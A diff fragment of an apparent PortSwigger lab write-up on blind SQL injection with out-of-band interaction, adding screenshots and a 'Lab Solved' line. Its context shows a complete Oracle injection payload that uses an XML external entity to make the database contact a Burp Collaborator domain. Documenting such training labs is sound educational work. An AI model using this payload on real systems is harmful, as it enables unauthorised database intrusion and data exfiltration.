@@ -27,3 +27,14 @@ For that the payload is
 Then query will be changed by pasting the external domain provided by collaborator would look like this
 
 `SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://in9x9dcxyjm7t0kstj6onj230u6luci1.oastify.com/"> %remote;]>'),'/l') FROM dual)--`
+
+![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/b9d05e37-f9d4-4c87-bdd1-5cb1af793a73)
+
+Poll now at collabrator
+
+![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a70c4861-002a-4766-86d1-e26067faf84f)
+
+Lab Solved
+
+![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/c320418c-b95b-4486-9895-0b84135f430c)
+
